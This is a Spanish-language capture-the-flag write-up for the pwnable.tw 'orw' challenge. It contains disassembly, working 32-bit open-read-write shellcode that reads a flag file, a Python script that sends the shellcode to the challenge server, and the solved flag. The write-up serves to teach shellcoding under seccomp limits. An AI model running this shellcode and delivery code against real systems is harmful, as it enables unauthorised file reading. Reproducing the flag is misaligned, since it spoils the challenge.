# orw
```
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

El programa toma shellcode del usuario y lo ejecuta. Usa `orw_seccomp` para solo permitir syscalls `open`, `read`, `write`:
```asm
Dump of assembler code for function main:
   0x08048548 <+0>:     lea    ecx,[esp+0x4]
   0x0804854c <+4>:     and    esp,0xfffffff0
   0x0804854f <+7>:     push   DWORD PTR [ecx-0x4]
   0x08048552 <+10>:    push   ebp
   0x08048553 <+11>:    mov    ebp,esp
   0x08048555 <+13>:    push   ecx
   0x08048556 <+14>:    sub    esp,0x4
   0x08048559 <+17>:    call   0x80484cb <orw_seccomp>
   0x0804855e <+22>:    sub    esp,0xc
   0x08048561 <+25>:    push   0x80486a0
   0x08048566 <+30>:    call   0x8048380 <printf@plt>
   0x0804856b <+35>:    add    esp,0x10
   0x0804856e <+38>:    sub    esp,0x4
   0x08048571 <+41>:    push   0xc8
   0x08048576 <+46>:    push   0x804a060
   0x0804857b <+51>:    push   0x0
   0x0804857d <+53>:    call   0x8048370 <read@plt>
   0x08048582 <+58>:    add    esp,0x10
   0x08048585 <+61>:    mov    eax,0x804a060
   0x0804858a <+66>:    call   eax
   0x0804858c <+68>:    mov    eax,0x0
   0x08048591 <+73>:    mov    ecx,DWORD PTR [ebp-0x4]
   0x08048594 <+76>:    leave
   0x08048595 <+77>:    lea    esp,[ecx-0x4]
   0x08048598 <+80>:    ret
```

Usamos shellcode para realizar un open-read-write y volcar al flag:
```asm
;  nasm code.asm ;  xxd -p code |tr -d '\n' | sed 's/\(..\)/\\x\1/g'
BITS 32
section .text
  global _start

_start:
  xor eax, eax
  xor ebx, ebx
  xor ecx, ecx
  xor edx, edx
  ; open(const char *filename, int flags, umode_t mode)
  push 0x00006761
  push 0x6c662f77
  push 0x726f2f65
  push 0x6d6f682f
  mov ebx, esp
  mov ecx, 0                ; none
  mov edx, 0                ; O_RDONLY 
  mov al, 0x5
  int 0x80
  ; read(unsigned int fd, char *buf, size_t count)
  mov ebx, eax              ; got fd from 'open'
  mov ecx, esp              ; save content here
  mov edx, 100              ; read 100 bytes
  mov al, 0x3           
  int 0x80
  ; write(unsigned int fd, const char *buf, size_t count)
  mov ebx, 1
  mov ecx, esp              ; read from here
  mov edx, 100              ; write 100 bytes
  mov al, 0x4
  int 0x80
```

```py
import socket, subprocess

proc = subprocess.run(r"nasm code.asm ;  xxd -p code |tr -d '\n' | sed 's/\(..\)/\\x\1/g'",capture_output=True, shell=True)
shellcode = bytes.fromhex(proc.stdout.decode('ascii').replace('\\x',''))

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("chall.pwnable.tw",10001))
print(s.recv(100))

s.send(shellcode)
print(s.recv(100))
```

`FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}`

